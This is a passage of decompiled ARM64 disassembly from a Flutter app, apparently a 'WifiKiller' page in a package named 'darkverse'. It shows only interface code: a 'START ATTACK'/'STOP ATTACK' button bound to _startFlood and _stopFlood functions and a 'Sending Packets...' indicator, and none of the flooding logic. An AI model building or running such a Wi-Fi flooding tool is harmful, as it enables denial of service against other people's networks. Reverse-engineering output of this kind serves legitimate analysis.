    // 0x94aad8: ldur            x0, [fp, #-0x58]
    // 0x94aadc: ldur            x2, [fp, #-0x10]
    // 0x94aae0: ldur            x1, [fp, #-0x40]
    // 0x94aae4: ldur            x3, [fp, #-0x38]
    // 0x94aae8: stur            x4, [fp, #-0x48]
    // 0x94aaec: r0 = Offset()
    //     0x94aaec: bl              #0x462c5c  ; AllocateOffsetStub -> Offset (size=0x18)
    // 0x94aaf0: stur            x0, [fp, #-0x50]
    // 0x94aaf4: StoreField: r0->field_7 = rZR
    //     0x94aaf4: stur            xzr, [x0, #7]
    // 0x94aaf8: d0 = 5.000000
    //     0x94aaf8: fmov            d0, #5.00000000
    // 0x94aafc: StoreField: r0->field_f = d0
    //     0x94aafc: stur            d0, [x0, #0xf]
    // 0x94ab00: r0 = BoxShadow()
    //     0x94ab00: bl              #0x5b73a8  ; AllocateBoxShadowStub -> BoxShadow (size=0x24)
    // 0x94ab04: stur            x0, [fp, #-0x60]
    // 0x94ab08: ArrayStore: r0[0] = rZR  ; List_8
    //     0x94ab08: stur            xzr, [x0, #0x17]
    // 0x94ab0c: r1 = Instance_BlurStyle
    //     0x94ab0c: add             x1, PP, #0xc, lsl #12  ; [pp+0xcc80] Obj!BlurStyle@a43cc1
    //     0x94ab10: ldr             x1, [x1, #0xc80]
    // 0x94ab14: StoreField: r0->field_1f = r1
    //     0x94ab14: stur            w1, [x0, #0x1f]
    // 0x94ab18: ldur            x1, [fp, #-0x48]
    // 0x94ab1c: StoreField: r0->field_7 = r1
    //     0x94ab1c: stur            w1, [x0, #7]
    // 0x94ab20: ldur            x1, [fp, #-0x50]
    // 0x94ab24: StoreField: r0->field_b = r1
    //     0x94ab24: stur            w1, [x0, #0xb]
    // 0x94ab28: d0 = 15.000000
    //     0x94ab28: fmov            d0, #15.00000000
    // 0x94ab2c: StoreField: r0->field_f = d0
    //     0x94ab2c: stur            d0, [x0, #0xf]
    // 0x94ab30: r1 = Null
    //     0x94ab30: mov             x1, NULL
    // 0x94ab34: r2 = 2
    //     0x94ab34: mov             x2, #2
    // 0x94ab38: r0 = AllocateArray()
    //     0x94ab38: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x94ab3c: mov             x2, x0
    // 0x94ab40: ldur            x0, [fp, #-0x60]
    // 0x94ab44: stur            x2, [fp, #-0x48]
    // 0x94ab48: StoreField: r2->field_f = r0
    //     0x94ab48: stur            w0, [x2, #0xf]
    // 0x94ab4c: r1 = <BoxShadow>
    //     0x94ab4c: add             x1, PP, #0xc, lsl #12  ; [pp+0xcc88] TypeArguments: <BoxShadow>
    //     0x94ab50: ldr             x1, [x1, #0xc88]
    // 0x94ab54: r0 = AllocateGrowableArray()
    //     0x94ab54: bl              #0xbf6a98  ; AllocateGrowableArrayStub
    // 0x94ab58: mov             x1, x0
    // 0x94ab5c: ldur            x0, [fp, #-0x48]
    // 0x94ab60: stur            x1, [fp, #-0x50]
    // 0x94ab64: StoreField: r1->field_f = r0
    //     0x94ab64: stur            w0, [x1, #0xf]
    // 0x94ab68: r0 = 2
    //     0x94ab68: mov             x0, #2
    // 0x94ab6c: StoreField: r1->field_b = r0
    //     0x94ab6c: stur            w0, [x1, #0xb]
    // 0x94ab70: r0 = BoxDecoration()
    //     0x94ab70: bl              #0x63648c  ; AllocateBoxDecorationStub -> BoxDecoration (size=0x28)
    // 0x94ab74: mov             x3, x0
    // 0x94ab78: ldur            x0, [fp, #-0x38]
    // 0x94ab7c: stur            x3, [fp, #-0x48]
    // 0x94ab80: StoreField: r3->field_7 = r0
    //     0x94ab80: stur            w0, [x3, #7]
    // 0x94ab84: ldur            x0, [fp, #-0x58]
    // 0x94ab88: StoreField: r3->field_13 = r0
    //     0x94ab88: stur            w0, [x3, #0x13]
    // 0x94ab8c: ldur            x0, [fp, #-0x50]
    // 0x94ab90: ArrayStore: r3[0] = r0  ; List_4
    //     0x94ab90: stur            w0, [x3, #0x17]
    // 0x94ab94: ldur            x0, [fp, #-0x40]
    // 0x94ab98: StoreField: r3->field_1b = r0
    //     0x94ab98: stur            w0, [x3, #0x1b]
    // 0x94ab9c: r0 = Instance_BoxShape
    //     0x94ab9c: add             x0, PP, #0xb, lsl #12  ; [pp+0xbd78] Obj!BoxShape@a406a1
    //     0x94aba0: ldr             x0, [x0, #0xd78]
    // 0x94aba4: StoreField: r3->field_23 = r0
    //     0x94aba4: stur            w0, [x3, #0x23]
    // 0x94aba8: ldur            x0, [fp, #-0x10]
    // 0x94abac: LoadField: r1 = r0->field_23
    //     0x94abac: ldur            w1, [x0, #0x23]
    // 0x94abb0: DecompressPointer r1
    //     0x94abb0: add             x1, x1, HEAP, lsl #32
    // 0x94abb4: tbnz            w1, #4, #0x94abd0
    // 0x94abb8: mov             x2, x0
    // 0x94abbc: r1 = Function '_stopFlood@962224228':.
    //     0x94abbc: add             x1, PP, #0x37, lsl #12  ; [pp+0x373d0] AnonymousClosure: (0x94bb88), in [package:darkverse/wifi_external.dart] _WifiKillerPageState::_stopFlood (0x94bbc0)
    //     0x94abc0: ldr             x1, [x1, #0x3d0]
    // 0x94abc4: r0 = AllocateClosure()
    //     0x94abc4: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x94abc8: mov             x5, x0
    // 0x94abcc: b               #0x94abe4
    // 0x94abd0: ldur            x2, [fp, #-0x10]
    // 0x94abd4: r1 = Function '_startFlood@962224228':.
    //     0x94abd4: add             x1, PP, #0x37, lsl #12  ; [pp+0x373d8] AnonymousClosure: (0x94b2c0), in [package:darkverse/wifi_external.dart] _WifiKillerPageState::_startFlood (0x94b2f8)
    //     0x94abd8: ldr             x1, [x1, #0x3d8]
    // 0x94abdc: r0 = AllocateClosure()
    //     0x94abdc: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x94abe0: mov             x5, x0
    // 0x94abe4: ldur            x0, [fp, #-0x10]
    // 0x94abe8: stur            x5, [fp, #-0x38]
    // 0x94abec: r0 = Radius()
    //     0x94abec: bl              #0x58951c  ; AllocateRadiusStub -> Radius (size=0x18)
    // 0x94abf0: d0 = 25.000000
    //     0x94abf0: fmov            d0, #25.00000000
    // 0x94abf4: stur            x0, [fp, #-0x40]
    // 0x94abf8: StoreField: r0->field_7 = d0
    //     0x94abf8: stur            d0, [x0, #7]
    // 0x94abfc: StoreField: r0->field_f = d0
    //     0x94abfc: stur            d0, [x0, #0xf]
    // 0x94ac00: r0 = BorderRadius()
    //     0x94ac00: bl              #0x58a7d8  ; AllocateBorderRadiusStub -> BorderRadius (size=0x18)
    // 0x94ac04: mov             x1, x0
    // 0x94ac08: ldur            x0, [fp, #-0x40]
    // 0x94ac0c: stur            x1, [fp, #-0x50]
    // 0x94ac10: StoreField: r1->field_7 = r0
    //     0x94ac10: stur            w0, [x1, #7]
    // 0x94ac14: StoreField: r1->field_b = r0
    //     0x94ac14: stur            w0, [x1, #0xb]
    // 0x94ac18: StoreField: r1->field_f = r0
    //     0x94ac18: stur            w0, [x1, #0xf]
    // 0x94ac1c: StoreField: r1->field_13 = r0
    //     0x94ac1c: stur            w0, [x1, #0x13]
    // 0x94ac20: r0 = RoundedRectangleBorder()
    //     0x94ac20: bl              #0x58ce88  ; AllocateRoundedRectangleBorderStub -> RoundedRectangleBorder (size=0x10)
    // 0x94ac24: mov             x1, x0
    // 0x94ac28: ldur            x0, [fp, #-0x50]
    // 0x94ac2c: StoreField: r1->field_b = r0
    //     0x94ac2c: stur            w0, [x1, #0xb]
    // 0x94ac30: r0 = Instance_BorderSide
    //     0x94ac30: add             x0, PP, #0xb, lsl #12  ; [pp+0xbd70] Obj!BorderSide@a28af1
    //     0x94ac34: ldr             x0, [x0, #0xd70]
    // 0x94ac38: StoreField: r1->field_7 = r0
    //     0x94ac38: stur            w0, [x1, #7]
    // 0x94ac3c: r16 = Instance_Color
    //     0x94ac3c: add             x16, PP, #0xb, lsl #12  ; [pp+0xbdc0] Obj!Color@a0e491
    //     0x94ac40: ldr             x16, [x16, #0xdc0]
    // 0x94ac44: stp             x1, x16, [SP]
    // 0x94ac48: r1 = Instance_Color
    //     0x94ac48: add             x1, PP, #0xb, lsl #12  ; [pp+0xbdc0] Obj!Color@a0e491
    //     0x94ac4c: ldr             x1, [x1, #0xdc0]
    // 0x94ac50: r4 = const [0, 0x3, 0x2, 0x1, shadowColor, 0x1, shape, 0x2, null]
    //     0x94ac50: add             x4, PP, #0x37, lsl #12  ; [pp+0x373e0] List(9) [0, 0x3, 0x2, 0x1, "shadowColor", 0x1, "shape", 0x2, Null]
    //     0x94ac54: ldr             x4, [x4, #0x3e0]
    // 0x94ac58: r0 = styleFrom()
    //     0x94ac58: bl              #0x6a6e2c  ; [package:flutter/src/material/elevated_button.dart] ElevatedButton::styleFrom
    // 0x94ac5c: mov             x1, x0
    // 0x94ac60: ldur            x0, [fp, #-0x10]
    // 0x94ac64: stur            x1, [fp, #-0x58]
    // 0x94ac68: LoadField: r2 = r0->field_23
    //     0x94ac68: ldur            w2, [x0, #0x23]
    // 0x94ac6c: DecompressPointer r2
    //     0x94ac6c: add             x2, x2, HEAP, lsl #32
    // 0x94ac70: stur            x2, [fp, #-0x50]
    // 0x94ac74: tbnz            w2, #4, #0x94ac84
    // 0x94ac78: r4 = Instance_IconData
    //     0x94ac78: add             x4, PP, #0x37, lsl #12  ; [pp+0x373e8] Obj!IconData@a02ec1
    //     0x94ac7c: ldr             x4, [x4, #0x3e8]
    // 0x94ac80: b               #0x94ac8c
    // 0x94ac84: r4 = Instance_IconData
    //     0x94ac84: add             x4, PP, #0x28, lsl #12  ; [pp+0x28c48] Obj!IconData@a01641
    //     0x94ac88: ldr             x4, [x4, #0xc48]
    // 0x94ac8c: ldur            x3, [fp, #-8]
    // 0x94ac90: stur            x4, [fp, #-0x40]
    // 0x94ac94: r0 = Icon()
    //     0x94ac94: bl              #0x6b0738  ; AllocateIconStub -> Icon (size=0x40)
    // 0x94ac98: mov             x1, x0
    // 0x94ac9c: ldur            x0, [fp, #-0x40]
    // 0x94aca0: stur            x1, [fp, #-0x60]
    // 0x94aca4: StoreField: r1->field_b = r0
    //     0x94aca4: stur            w0, [x1, #0xb]
    // 0x94aca8: r0 = 24.000000
    //     0x94aca8: add             x0, PP, #0xd, lsl #12  ; [pp+0xdbc8] 24
    //     0x94acac: ldr             x0, [x0, #0xbc8]
    // 0x94acb0: StoreField: r1->field_f = r0
    //     0x94acb0: stur            w0, [x1, #0xf]
    // 0x94acb4: ldur            x0, [fp, #-8]
    // 0x94acb8: StoreField: r1->field_23 = r0
    //     0x94acb8: stur            w0, [x1, #0x23]
    // 0x94acbc: ldur            x2, [fp, #-0x50]
    // 0x94acc0: tbnz            w2, #4, #0x94acd0
    // 0x94acc4: r6 = "STOP ATTACK"
    //     0x94acc4: add             x6, PP, #0x37, lsl #12  ; [pp+0x373f0] "STOP ATTACK"
    //     0x94acc8: ldr             x6, [x6, #0x3f0]
    // 0x94accc: b               #0x94acd8
    // 0x94acd0: r6 = "START ATTACK"
    //     0x94acd0: add             x6, PP, #0x37, lsl #12  ; [pp+0x373f8] "START ATTACK"
    //     0x94acd4: ldr             x6, [x6, #0x3f8]
    // 0x94acd8: ldur            x2, [fp, #-0x10]
    // 0x94acdc: ldur            x5, [fp, #-0x28]
    // 0x94ace0: ldur            x4, [fp, #-0x18]
    // 0x94ace4: ldur            x3, [fp, #-0x30]
    // 0x94ace8: stur            x6, [fp, #-0x40]
    // 0x94acec: r0 = TextStyle()
    //     0x94acec: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x94acf0: mov             x1, x0
    // 0x94acf4: r0 = true
    //     0x94acf4: add             x0, NULL, #0x20  ; true
    // 0x94acf8: stur            x1, [fp, #-0x50]
    // 0x94acfc: StoreField: r1->field_7 = r0
    //     0x94acfc: stur            w0, [x1, #7]
    // 0x94ad00: ldur            x2, [fp, #-8]
    // 0x94ad04: StoreField: r1->field_b = r2
    //     0x94ad04: stur            w2, [x1, #0xb]
    // 0x94ad08: r2 = 16.000000
    //     0x94ad08: add             x2, PP, #0x12, lsl #12  ; [pp+0x12008] 16
    //     0x94ad0c: ldr             x2, [x2, #8]
    // 0x94ad10: StoreField: r1->field_1f = r2
    //     0x94ad10: stur            w2, [x1, #0x1f]
    // 0x94ad14: r2 = Instance_FontWeight
    //     0x94ad14: add             x2, PP, #0xc, lsl #12  ; [pp+0xcf08] Obj!FontWeight@a0c471
    //     0x94ad18: ldr             x2, [x2, #0xf08]
    // 0x94ad1c: StoreField: r1->field_23 = r2
    //     0x94ad1c: stur            w2, [x1, #0x23]
    // 0x94ad20: r2 = 2.000000
    //     0x94ad20: add             x2, PP, #0x11, lsl #12  ; [pp+0x11590] 2
    //     0x94ad24: ldr             x2, [x2, #0x590]
    // 0x94ad28: StoreField: r1->field_2b = r2
    //     0x94ad28: stur            w2, [x1, #0x2b]
    // 0x94ad2c: r2 = "Orbitron"
    //     0x94ad2c: add             x2, PP, #0xc, lsl #12  ; [pp+0xcf20] "Orbitron"
    //     0x94ad30: ldr             x2, [x2, #0xf20]
    // 0x94ad34: StoreField: r1->field_13 = r2
    //     0x94ad34: stur            w2, [x1, #0x13]
    // 0x94ad38: r0 = Text()
    //     0x94ad38: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x94ad3c: mov             x1, x0
    // 0x94ad40: ldur            x0, [fp, #-0x40]
    // 0x94ad44: stur            x1, [fp, #-8]
    // 0x94ad48: StoreField: r1->field_b = r0
    //     0x94ad48: stur            w0, [x1, #0xb]
    // 0x94ad4c: ldur            x0, [fp, #-0x50]
    // 0x94ad50: StoreField: r1->field_13 = r0
    //     0x94ad50: stur            w0, [x1, #0x13]
    // 0x94ad54: r0 = ElevatedButton()
    //     0x94ad54: bl              #0x6b0714  ; AllocateElevatedButtonStub -> ElevatedButton (size=0x40)
    // 0x94ad58: mov             x1, x0
    // 0x94ad5c: ldur            x2, [fp, #-0x60]
    // 0x94ad60: ldur            x3, [fp, #-8]
    // 0x94ad64: ldur            x5, [fp, #-0x38]
    // 0x94ad68: ldur            x6, [fp, #-0x58]
    // 0x94ad6c: stur            x0, [fp, #-8]
    // 0x94ad70: r0 = ElevatedButton.icon()
    //     0x94ad70: bl              #0x6b83a8  ; [package:flutter/src/material/elevated_button.dart] ElevatedButton::ElevatedButton.icon
    // 0x94ad74: r0 = Container()
    //     0x94ad74: bl              #0x694b98  ; AllocateContainerStub -> Container (size=0x38)
    // 0x94ad78: stur            x0, [fp, #-0x38]
    // 0x94ad7c: r16 = 60.000000
    //     0x94ad7c: add             x16, PP, #0x16, lsl #12  ; [pp+0x16460] 60
    //     0x94ad80: ldr             x16, [x16, #0x460]
    // 0x94ad84: r30 = inf
    //     0x94ad84: add             lr, PP, #0x14, lsl #12  ; [pp+0x145d0] inf
    //     0x94ad88: ldr             lr, [lr, #0x5d0]
    // 0x94ad8c: stp             lr, x16, [SP, #0x10]
    // 0x94ad90: ldur            x16, [fp, #-0x48]
    // 0x94ad94: ldur            lr, [fp, #-8]
    // 0x94ad98: stp             lr, x16, [SP]
    // 0x94ad9c: mov             x1, x0
    // 0x94ada0: r4 = const [0, 0x5, 0x4, 0x1, child, 0x4, decoration, 0x3, height, 0x1, width, 0x2, null]
    //     0x94ada0: add             x4, PP, #0x14, lsl #12  ; [pp+0x14e68] List(13) [0, 0x5, 0x4, 0x1, "child", 0x4, "decoration", 0x3, "height", 0x1, "width", 0x2, Null]
    //     0x94ada4: ldr             x4, [x4, #0xe68]
    // 0x94ada8: r0 = Container()
    //     0x94ada8: bl              #0x6945fc  ; [package:flutter/src/widgets/container.dart] Container::Container
    // 0x94adac: r0 = Center()
    //     0x94adac: bl              #0x641520  ; AllocateCenterStub -> Center (size=0x1c)
    // 0x94adb0: mov             x3, x0
    // 0x94adb4: r0 = Instance_Alignment
    //     0x94adb4: ldr             x0, [PP, #0x6fa8]  ; [pp+0x6fa8] Obj!Alignment@a09cf1
    // 0x94adb8: stur            x3, [fp, #-8]
    // 0x94adbc: StoreField: r3->field_f = r0
    //     0x94adbc: stur            w0, [x3, #0xf]
    // 0x94adc0: ldur            x1, [fp, #-0x38]
    // 0x94adc4: StoreField: r3->field_b = r1
    //     0x94adc4: stur            w1, [x3, #0xb]
    // 0x94adc8: r1 = Null
    //     0x94adc8: mov             x1, NULL
    // 0x94adcc: r2 = 16
    //     0x94adcc: mov             x2, #0x10
    // 0x94add0: r0 = AllocateArray()
    //     0x94add0: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x94add4: mov             x2, x0
    // 0x94add8: ldur            x0, [fp, #-0x28]
    // 0x94addc: stur            x2, [fp, #-0x38]
    // 0x94ade0: StoreField: r2->field_f = r0
    //     0x94ade0: stur            w0, [x2, #0xf]
    // 0x94ade4: r16 = Instance_SizedBox
    //     0x94ade4: add             x16, PP, #0x12, lsl #12  ; [pp+0x12050] Obj!SizedBox@a3a801
    //     0x94ade8: ldr             x16, [x16, #0x50]
    // 0x94adec: StoreField: r2->field_13 = r16
    //     0x94adec: stur            w16, [x2, #0x13]
    // 0x94adf0: ldur            x0, [fp, #-0x18]
    // 0x94adf4: ArrayStore: r2[0] = r0  ; List_4
    //     0x94adf4: stur            w0, [x2, #0x17]
    // 0x94adf8: r16 = Instance_SizedBox
    //     0x94adf8: add             x16, PP, #0x11, lsl #12  ; [pp+0x115b0] Obj!SizedBox@a3a7e1
    //     0x94adfc: ldr             x16, [x16, #0x5b0]
    // 0x94ae00: StoreField: r2->field_1b = r16
    //     0x94ae00: stur            w16, [x2, #0x1b]
    // 0x94ae04: ldur            x0, [fp, #-0x30]
    // 0x94ae08: StoreField: r2->field_1f = r0
    //     0x94ae08: stur            w0, [x2, #0x1f]
    // 0x94ae0c: r16 = Instance_SizedBox
    //     0x94ae0c: add             x16, PP, #0x11, lsl #12  ; [pp+0x11e10] Obj!SizedBox@a3aec1
    //     0x94ae10: ldr             x16, [x16, #0xe10]
    // 0x94ae14: StoreField: r2->field_23 = r16
    //     0x94ae14: stur            w16, [x2, #0x23]
    // 0x94ae18: ldur            x0, [fp, #-8]
    // 0x94ae1c: StoreField: r2->field_27 = r0
    //     0x94ae1c: stur            w0, [x2, #0x27]
    // 0x94ae20: r16 = Instance_SizedBox
    //     0x94ae20: add             x16, PP, #0x11, lsl #12  ; [pp+0x115b0] Obj!SizedBox@a3a7e1
    //     0x94ae24: ldr             x16, [x16, #0x5b0]
    // 0x94ae28: StoreField: r2->field_2b = r16
    //     0x94ae28: stur            w16, [x2, #0x2b]
    // 0x94ae2c: r1 = <Widget>
    //     0x94ae2c: ldr             x1, [PP, #0x5168]  ; [pp+0x5168] TypeArguments: <Widget>
    // 0x94ae30: r0 = AllocateGrowableArray()
    //     0x94ae30: bl              #0xbf6a98  ; AllocateGrowableArrayStub
    // 0x94ae34: mov             x1, x0
    // 0x94ae38: ldur            x0, [fp, #-0x38]
    // 0x94ae3c: stur            x1, [fp, #-8]
    // 0x94ae40: StoreField: r1->field_f = r0
    //     0x94ae40: stur            w0, [x1, #0xf]
    // 0x94ae44: r0 = 16
    //     0x94ae44: mov             x0, #0x10
    // 0x94ae48: StoreField: r1->field_b = r0
    //     0x94ae48: stur            w0, [x1, #0xb]
    // 0x94ae4c: ldur            x0, [fp, #-0x10]
    // 0x94ae50: LoadField: r2 = r0->field_23
    //     0x94ae50: ldur            w2, [x0, #0x23]
    // 0x94ae54: DecompressPointer r2
    //     0x94ae54: add             x2, x2, HEAP, lsl #32
    // 0x94ae58: tbnz            w2, #4, #0x94afe0
    // 0x94ae5c: r0 = CircularProgressIndicator()
    //     0x94ae5c: bl              #0x6b2108  ; AllocateCircularProgressIndicatorStub -> CircularProgressIndicator (size=0x48)
    // 0x94ae60: mov             x1, x0
    // 0x94ae64: r0 = Instance__ActivityIndicatorType
    //     0x94ae64: add             x0, PP, #0x15, lsl #12  ; [pp+0x157f8] Obj!_ActivityIndicatorType@a41001
    //     0x94ae68: ldr             x0, [x0, #0x7f8]
    // 0x94ae6c: stur            x1, [fp, #-0x10]
    // 0x94ae70: StoreField: r1->field_23 = r0
    //     0x94ae70: stur            w0, [x1, #0x23]
    // 0x94ae74: r0 = Instance_Color
    //     0x94ae74: add             x0, PP, #0x13, lsl #12  ; [pp+0x13d28] Obj!Color@a0f031
    //     0x94ae78: ldr             x0, [x0, #0xd28]
    // 0x94ae7c: StoreField: r1->field_13 = r0
    //     0x94ae7c: stur            w0, [x1, #0x13]
    // 0x94ae80: r0 = SizedBox()
    //     0x94ae80: bl              #0x6b184c  ; AllocateSizedBoxStub -> SizedBox (size=0x18)
    // 0x94ae84: mov             x1, x0
    // 0x94ae88: r0 = 10.000000
    //     0x94ae88: add             x0, PP, #0xc, lsl #12  ; [pp+0xc778] 10
    //     0x94ae8c: ldr             x0, [x0, #0x778]
    // 0x94ae90: stur            x1, [fp, #-0x18]
    // 0x94ae94: StoreField: r1->field_13 = r0
    //     0x94ae94: stur            w0, [x1, #0x13]
    // 0x94ae98: r0 = TextStyle()
    //     0x94ae98: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x94ae9c: mov             x1, x0
    // 0x94aea0: r0 = true
    //     0x94aea0: add             x0, NULL, #0x20  ; true
    // 0x94aea4: stur            x1, [fp, #-0x28]
    // 0x94aea8: StoreField: r1->field_7 = r0
    //     0x94aea8: stur            w0, [x1, #7]
    // 0x94aeac: r2 = Instance_Color
    //     0x94aeac: add             x2, PP, #0x13, lsl #12  ; [pp+0x13d28] Obj!Color@a0f031
    //     0x94aeb0: ldr             x2, [x2, #0xd28]
    // 0x94aeb4: StoreField: r1->field_b = r2
    //     0x94aeb4: stur            w2, [x1, #0xb]
    // 0x94aeb8: r2 = "ShareTechMono"
    //     0x94aeb8: add             x2, PP, #0x18, lsl #12  ; [pp+0x187c8] "ShareTechMono"
    //     0x94aebc: ldr             x2, [x2, #0x7c8]
    // 0x94aec0: StoreField: r1->field_13 = r2
    //     0x94aec0: stur            w2, [x1, #0x13]
    // 0x94aec4: r0 = Text()
    //     0x94aec4: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x94aec8: mov             x3, x0
    // 0x94aecc: r0 = "Sending Packets..."
    //     0x94aecc: add             x0, PP, #0x37, lsl #12  ; [pp+0x37400] "Sending Packets..."
    //     0x94aed0: ldr             x0, [x0, #0x400]
    // 0x94aed4: stur            x3, [fp, #-0x30]
    // 0x94aed8: StoreField: r3->field_b = r0
    //     0x94aed8: stur            w0, [x3, #0xb]
    // 0x94aedc: ldur            x0, [fp, #-0x28]
    // 0x94aee0: StoreField: r3->field_13 = r0
    //     0x94aee0: stur            w0, [x3, #0x13]
    // 0x94aee4: r1 = Null
    //     0x94aee4: mov             x1, NULL
    // 0x94aee8: r2 = 6
    //     0x94aee8: mov             x2, #6
    // 0x94aeec: r0 = AllocateArray()
    //     0x94aeec: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x94aef0: mov             x2, x0
    // 0x94aef4: ldur            x0, [fp, #-0x10]
    // 0x94aef8: stur            x2, [fp, #-0x28]
    // 0x94aefc: StoreField: r2->field_f = r0
    //     0x94aefc: stur            w0, [x2, #0xf]
    // 0x94af00: ldur            x0, [fp, #-0x18]
    // 0x94af04: StoreField: r2->field_13 = r0
    //     0x94af04: stur            w0, [x2, #0x13]
    // 0x94af08: ldur            x0, [fp, #-0x30]
    // 0x94af0c: ArrayStore: r2[0] = r0  ; List_4
    //     0x94af0c: stur            w0, [x2, #0x17]
    // 0x94af10: r1 = <Widget>
    //     0x94af10: ldr             x1, [PP, #0x5168]  ; [pp+0x5168] TypeArguments: <Widget>
    // 0x94af14: r0 = AllocateGrowableArray()
    //     0x94af14: bl              #0xbf6a98  ; AllocateGrowableArrayStub
    // 0x94af18: mov             x1, x0
    // 0x94af1c: ldur            x0, [fp, #-0x28]
    // 0x94af20: stur            x1, [fp, #-0x10]
    // 0x94af24: StoreField: r1->field_f = r0
    //     0x94af24: stur            w0, [x1, #0xf]
    // 0x94af28: r0 = 6
    //     0x94af28: mov             x0, #6
    // 0x94af2c: StoreField: r1->field_b = r0
    //     0x94af2c: stur            w0, [x1, #0xb]
    // 0x94af30: r0 = Column()
    //     0x94af30: bl              #0x641538  ; AllocateColumnStub -> Column (size=0x38)
    // 0x94af34: mov             x1, x0
    // 0x94af38: r0 = Instance_Axis
    //     0x94af38: ldr             x0, [PP, #0x46d0]  ; [pp+0x46d0] Obj!Axis@a40801
    // 0x94af3c: stur            x1, [fp, #-0x18]
    // 0x94af40: StoreField: r1->field_f = r0
    //     0x94af40: stur            w0, [x1, #0xf]
    // 0x94af44: r2 = Instance_MainAxisAlignment
    //     0x94af44: ldr             x2, [PP, #0x6f78]  ; [pp+0x6f78] Obj!MainAxisAlignment@a403c1
    // 0x94af48: StoreField: r1->field_13 = r2
    //     0x94af48: stur            w2, [x1, #0x13]
    // 0x94af4c: r3 = Instance_MainAxisSize
    //     0x94af4c: add             x3, PP, #0xc, lsl #12  ; [pp+0xcbc0] Obj!MainAxisSize@a403e1
    //     0x94af50: ldr             x3, [x3, #0xbc0]
    // 0x94af54: ArrayStore: r1[0] = r3  ; List_4
    //     0x94af54: stur            w3, [x1, #0x17]
    // 0x94af58: r4 = Instance_CrossAxisAlignment
    //     0x94af58: ldr             x4, [PP, #0x6f88]  ; [pp+0x6f88] Obj!CrossAxisAlignment@a402c1
    // 0x94af5c: StoreField: r1->field_1b = r4
    //     0x94af5c: stur            w4, [x1, #0x1b]
    // 0x94af60: r4 = Instance_VerticalDirection
    //     0x94af60: ldr             x4, [PP, #0x6f90]  ; [pp+0x6f90] Obj!VerticalDirection@a407a1
    // 0x94af64: StoreField: r1->field_23 = r4
    //     0x94af64: stur            w4, [x1, #0x23]
    // 0x94af68: r5 = Instance_Clip
    //     0x94af68: ldr             x5, [PP, #0x6f98]  ; [pp+0x6f98] Obj!Clip@a43d81
    // 0x94af6c: StoreField: r1->field_2b = r5
    //     0x94af6c: stur            w5, [x1, #0x2b]
    // 0x94af70: StoreField: r1->field_2f = rZR
    //     0x94af70: stur            xzr, [x1, #0x2f]
    // 0x94af74: ldur            x6, [fp, #-0x10]
    // 0x94af78: StoreField: r1->field_b = r6
    //     0x94af78: stur            w6, [x1, #0xb]
    // 0x94af7c: r0 = Center()
    //     0x94af7c: bl              #0x641520  ; AllocateCenterStub -> Center (size=0x1c)
    // 0x94af80: mov             x2, x0
    // 0x94af84: r0 = Instance_Alignment
    //     0x94af84: ldr             x0, [PP, #0x6fa8]  ; [pp+0x6fa8] Obj!Alignment@a09cf1
    // 0x94af88: stur            x2, [fp, #-0x10]
    // 0x94af8c: StoreField: r2->field_f = r0
    //     0x94af8c: stur            w0, [x2, #0xf]
    // 0x94af90: ldur            x0, [fp, #-0x18]
    // 0x94af94: StoreField: r2->field_b = r0
    //     0x94af94: stur            w0, [x2, #0xb]
    // 0x94af98: ldur            x1, [fp, #-8]
    // 0x94af9c: r0 = _growToNextCapacity()
    //     0x94af9c: bl              #0x4578a8  ; [dart:core] _GrowableList::_growToNextCapacity
    // 0x94afa0: ldur            x2, [fp, #-8]
    // 0x94afa4: r0 = 18
    //     0x94afa4: mov             x0, #0x12
    // 0x94afa8: StoreField: r2->field_b = r0
    //     0x94afa8: stur            w0, [x2, #0xb]
    // 0x94afac: LoadField: r1 = r2->field_f
    //     0x94afac: ldur            w1, [x2, #0xf]
    // 0x94afb0: DecompressPointer r1
    //     0x94afb0: add             x1, x1, HEAP, lsl #32
    // 0x94afb4: ldur            x0, [fp, #-0x10]
    // 0x94afb8: ArrayStore: r1[8] = r0  ; List_4
    //     0x94afb8: add             x25, x1, #0x2f
    //     0x94afbc: str             w0, [x25]
    //     0x94afc0: tbz             w0, #0, #0x94afdc
    //     0x94afc4: ldurb           w16, [x1, #-1]
    //     0x94afc8: ldurb           w17, [x0, #-1]
    //     0x94afcc: and             x16, x17, x16, lsr #2
    //     0x94afd0: tst             x16, HEAP, lsr #32
    //     0x94afd4: b.eq            #0x94afdc
    //     0x94afd8: bl              #0xbf5df0  ; ArrayWriteBarrierStub
    // 0x94afdc: b               #0x94afe4
    // 0x94afe0: mov             x2, x1
    // 0x94afe4: ldur            x0, [fp, #-0x20]
    // 0x94afe8: r0 = Column()
    //     0x94afe8: bl              #0x641538  ; AllocateColumnStub -> Column (size=0x38)
    // 0x94afec: mov             x1, x0
    // 0x94aff0: r0 = Instance_Axis
    //     0x94aff0: ldr             x0, [PP, #0x46d0]  ; [pp+0x46d0] Obj!Axis@a40801
    // 0x94aff4: stur            x1, [fp, #-0x10]
    // 0x94aff8: StoreField: r1->field_f = r0
    //     0x94aff8: stur            w0, [x1, #0xf]
    // 0x94affc: r0 = Instance_MainAxisAlignment
    //     0x94affc: ldr             x0, [PP, #0x6f78]  ; [pp+0x6f78] Obj!MainAxisAlignment@a403c1
    // 0x94b000: StoreField: r1->field_13 = r0
    //     0x94b000: stur            w0, [x1, #0x13]
    // 0x94b004: r0 = Instance_MainAxisSize
    //     0x94b004: add             x0, PP, #0xc, lsl #12  ; [pp+0xcbc0] Obj!MainAxisSize@a403e1
    //     0x94b008: ldr             x0, [x0, #0xbc0]
    // 0x94b00c: ArrayStore: r1[0] = r0  ; List_4
    //     0x94b00c: stur            w0, [x1, #0x17]
    // 0x94b010: r0 = Instance_CrossAxisAlignment
    //     0x94b010: add             x0, PP, #0xa, lsl #12  ; [pp+0xada0] Obj!CrossAxisAlignment@a402e1
    //     0x94b014: ldr             x0, [x0, #0xda0]
    // 0x94b018: StoreField: r1->field_1b = r0
    //     0x94b018: stur            w0, [x1, #0x1b]
    // 0x94b01c: r0 = Instance_VerticalDirection
